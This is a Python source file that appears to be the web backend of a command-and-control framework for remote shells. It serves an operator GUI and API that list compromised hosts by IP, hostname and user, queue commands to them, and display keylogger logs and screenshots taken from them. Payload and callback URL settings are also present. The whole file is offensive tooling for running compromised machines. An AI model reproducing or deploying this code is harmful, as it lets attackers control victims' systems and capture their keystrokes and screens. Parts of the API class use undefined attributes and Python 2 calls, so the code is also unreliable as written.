#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author: Mr.Un1k0d3r RingZer0 Team
    @package: core/apis.py
"""

import hashlib
import json
import base64
import os
import fnmatch
import logging
from flask import Flask, session, request, escape
from urllib.parse import quote_plus
from core.websync import Sync
from core.utils import Utils
from core.log import Log
from core.shell import Shell


class FlaskFactory(Flask):

    def init(self, config, cli):
        self.sync = Sync(config)
        self.secret_key = Utils.gen_str(32)
        self.session = session
        self.request = request
        self.internal_config = config
        self.redis = self.internal_config.get("redis")
        self.shell = Shell(self.redis)
        self.cli = cli
        self.active_users = []
        self.msgs = []
        self.cmds = []
        self.username = ""
        self.command = ""
        self.debug = False
        if self.internal_config.get("debug-mode").lower() == "on":
           self.debug = True

    def auth(self):
        if "authenticated" in self.session:
            return True
        return False

    def get_user(self):
        if "username" in self.session:
            return self.session["username"]
        return "unknown"

    def set_user(self):
        password = request.form["password"].strip().encode("utf-8")
        self.session["authenticated"] = True
        self.session["uid"] = Utils.guid()
        self.session["username"] = escape(request.form["username"].strip())
        self.session["password"] = hashlib.sha512(password).hexdigest()
        self.active_users.append(self.session["username"])
        Log.log_event("User Login", "%s" % str(self.session["username"]))
        self.redis.append_server_events("\n[%s] User Login: %s" % (Utils.timestamp(),str(self.session["username"])))

    def post_login(self):
        if request.form["username"].strip() in self.active_users:
            return -1
        if self.request.form["password"].strip() == self.internal_config.get("server-password"):
            self.set_user()
            return True
        return False

    def get_username(self):
        return self.session["username"]

    def get_password(self):
        return self.session["password"]

    def logout(self):
        self.active_users.remove(str(self.session["username"]))
        Log.log_event("User Logout", "%s" % str(self.session["username"]))
        self.session.pop("username")
        self.session.pop("authenticated")

    def send_msg(self, msg):
        self.msgs.append(msg)
        return ""

    def get_msgs(self):
        return self.msgs

    def hook_shell(self, id):
        uid = self.session["uid"]
        return self.redis.add_active_user(uid, id)

    def unhook_shell(self, id):
        uid = self.session["uid"]
        return self.redis.remove_active_user(uid, id)

    def send_cmd(self, id, cmd, username,):
        output, cmd = self.shell.evalute_cmd(cmd)
        cmd_guid = Utils.guid()
        self.redis.append_shell_data(id, "[%s] %s - Sending command: %s\n%s\n\n" % (Utils.timestamp(), username, output, cmd))
        Log.log_shell(id, "- Sending command", "%s\n%s" % (output, cmd), username=username)
        if not cmd == "":
            self.redis.push_cmd(id, cmd, cmd_guid, username)
        return json.dumps({"output": output})

    def html_escape(self, data):
        html_escape_table = {"&": "&amp;","\"": "&quot;","'": "&apos;",">": "&gt;","<": "&lt;"}
        return "".join(html_escape_table.get(c, c) for c in data)

    def get_output(self, id):
        return self.sync.get_cmd_output(self.session["uid"], id)

    def get_input(self, id):
        return self.sync.get_cmd_send(self.session["uid"], id)

    def get_ip(self):
        host = self.internal_config.get("http-host")
        return host

    def get_port(self):
        port = self.internal_config.get("http-port")
        return port

    def get_events(self):
        return self.redis.get_server_events().decode()

    def get_log_date(self, name):
        dates = fnmatch.filter(os.listdir(os.getcwd() + "/logs/"), "*-*-*")
        self.log_dates = []
        logs = ["event", "http", "error", "chat", "shell", "keylogger"]
        for date in dates:

            if name == "screenshot":
                file_name = fnmatch.filter(os.listdir("%s/logs/%s" % (os.getcwd(), date)), "*.png")
                if file_name:
                    if date not in self.log_dates:
                        self.log_dates.append(date)

            if name in logs:
                file_name = fnmatch.filter(os.listdir("%s/logs/%s" % (os.getcwd(), date)), "%s*.log" % name)
                if file_name:
                    if date not in self.log_dates:
                        self.log_dates.append(date)

        return sorted(self.log_dates, key=lambda d: list(map(int, d.split("-"))))

    def get_log_names(self, log_type):
        logs = ["shell", "keylogger", "screenshot"]
        log_info = dict()
        for date in self.log_dates:
            if log_type in logs:
                if log_type == "screenshot":
                    file_names = fnmatch.filter(os.listdir("%s/logs/%s" % (os.getcwd(), date)), "%s_*.png" % log_type)
                    if file_names:
                        for file_name in file_names:
                            log_info[file_name] = date
                else:
                    file_names = fnmatch.filter(os.listdir("%s/logs/%s" % (os.getcwd(), date)), "%s_*.log" % log_type)
                    if file_names:
                        for file_name in file_names:
                            log_info[file_name] = date
        return log_info

    def get_log_data(self, date, name):
        logs = ["event", "http", "error", "chat", "screenshots", "shells", "keylogger", "downloads"]

        if name == "dashboard":
            try:
                path = "%s/logs/%s/event.log" % (os.getcwd(), date)
                return open(path, "r").read()
            except:
                return "No recent activity"
        elif "screenshot_" in name:
            try:
                path = "%s/logs/%s/%s" % (os.getcwd(), date, name)
                b64_str = base64.b64encode(open(path, "rb").read())
                return b64_str
            except:
                return "No recent activity."
        elif name in logs:
            try:
                path = "%s/logs/%s/%s.log" % (os.getcwd(), date, name)
                return open(path, "r").read()
            except:
                return "No recent activity."
        else:
            try:
                path = "%s/logs/%s/%s" % (os.getcwd(), date, name)
                return open(path, "r").read()
            except:
                return "No recent activity."

    def get_screenshots(self, id):
        screenshots = []
        path = os.walk("%s/logs/" % (os.getcwd()))
        for root,directories,file_names in path:
            screenshots_id = "%s.png" % id
            for file_name in file_names:
                if screenshots_id in file_name:
                    if file_name not in screenshots:
                        screenshots.append(os.path.join(root, file_name))
        return screenshots


    def get_screenshot(self, date, name):
        path = "%s/logs/%s/%s" % (os.getcwd(), date, name)
        b64_str = base64.b64encode(open(path, "rb").read())
        return b64_str


    def get_shells(self):
        shells_list = []
        shells = self.redis.get_all_shells()
        for shell in shells:
            shell = shell.decode()
            prompt = self.redis.get_prompt(shell.split(":")[0]).decode()
            shell_info = {
                "shell_ip": shell.split(":")[2].encode(),
                "shell_id": shell.split(":")[0].encode(),
                "shell_prompt": prompt.split(" ")[1].encode(),
                "shell_prompt_full": prompt.encode(),
                "shell_hostname": prompt.split(" ")[0].encode(),
                "shell_timestamp": self.redis.get_data(shell),
                }
            shells_list.append(shell_info)
            try:
                shells_list = sorted(shells_list, key = lambda shell_info: shell_info["shell_timestamp"], reverse=True)
            except TypeError:
                pass
            #print(shells_list)
        return shells_list

    def get_shell_domain(self, id):
        domain = self.redis.get_prompt(id).split(" ")[1].split("\\")[0]
        return domain

    def get_shell_hostname(self, id):
        hostname = self.redis.get_prompt(id).split(" ")[0]
        return hostname

    def get_shell_user(self, id):
        user = self.redis.get_prompt(id).split(" ")[1].split("\\")[1]
        return user

    def get_payload_name(self):
        return self.internal_config.get("http-download-path")

    def get_payload_url(self):
        return self.internal_config.get("callback-url")

    def get_protocol(self):
        if self.internal_config.get("https-enabled") == "on":
            return "https://"
        else:
            return "http://"

    def get_keylogger(self, id):
        return self.redis.get_keylogger_data(id)

    def get_shell(self, id):
        return self.redis.get_shell_data(id)

    def get_session_uid(self):
        return self.session["uid"]

    def delete_shell(self, id, username):
        shells = self.redis.get_all_shells()
        self.send_cmd(id, "exit", username)
        for shell in shells:
            shell = shell.decode()
            if id in shell:
                return self.redis.delete_entry(shell)

    def get_gui_host(self):
        return self.internal_config.get("gui-host")

    def get_gui_port(self):
        return self.internal_config.get("gui-port")

    def get_gui_password(self):
        return self.internal_config.get("server-password")


class ServerApi:

    def __init__(self, config, request):
        self.config = config
        self.request = request
        self.redis = self.config.get("redis")
        self.output = {}
        self.output["success"] = 1

    def process(self):
        callback = self.request.path.split("/")[2].lower()
        if callback == "login":
            self.auth()
        elif callback == "list":
            self.get_shells()
        elif callback == "shell":
            self.get_shell_output()
        return json.dumps(self.output)

    def get_header(self, key):
        return self.request.headers.getheader(key)

    def auth(self):
        if hashlib.sha512(self.config.get("server-password")).hexdigest() == self.get_header("Authorization"):
            self.output["authorized"] = 1
            return True
        self.output["authorized"] = 0
        return False

    def get_shells(self):
        if self.auth():
            shells = []
            for shell in self.redis.get_all_shells():
                guid = shell.split(":")[0]
                prompt = self.redis.get_prompt(guid)
                shells.append("%s %s" % (guid, prompt))
            self.output["shells"] = shells

    def get_shell_output(self):
        if self.auth():
            guid = self.request.path.split("/")[3]
            guid = Utils.validate_guid(guid)
            path = Log.get_current_path("shell_%s.log" % guid)
            data = Utils.load_file(path, False, False)
            self.output["data"] = base64.b64encode(data)
            return self.output["data"]

                

    def send_shell_cmd(self):
        if self.auth():
            guid = self.request.path.split("/")[3]
            guid = Utils.validate_guid(guid)
            self.redis.push_cmd(guid, self.get_post_data(), Utils.guid())


    def get_post_data(self):
        length = 0
        if not self.headers.getheader("Content-Length") == None:
            length = int(self.headers.getheader("Content-Length"))
        return self.rfile.read(length)
